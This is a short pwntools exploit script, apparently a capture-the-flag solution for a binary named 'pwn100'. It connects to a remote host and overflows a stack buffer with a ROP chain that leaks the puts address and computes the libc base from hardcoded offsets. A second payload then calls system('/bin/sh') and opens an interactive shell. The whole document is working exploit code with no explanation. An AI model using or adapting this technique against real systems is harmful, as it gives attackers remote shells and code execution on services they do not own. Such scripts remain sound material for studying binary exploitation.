from pwn import *

elf = ELF("./pwn100")

#sh = process("./pwn100")
sh = remote("111.198.29.45",31504)

payload = ("1"*0x48 + p64(0x400763) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x400550)).ljust(200)

sh.sendline(payload)

sh.recvuntil('~\n')

puts_addr =  u64(sh.recv()[-7:-1].ljust(8,"\x00"))
libc_base =  puts_addr - 0x06f690
print "libc_base", hex(libc_base)
system = libc_base + 0x045390
print "system", hex(system)
bin_sh = libc_base + 0x18cd57
print "bin_sh", hex(bin_sh)

payload = ("2"*0x47 + p64(0x400763) + p64(bin_sh) + p64(system) + p64(0xdeadbeef)).ljust(200)

#payload = ("2"*0x47 + p64(0x400763)  + p64(0xdeadbeef) + p64(system) + p64(bin_sh)).ljust(200)

sh.sendline(payload)

sh.interactive()
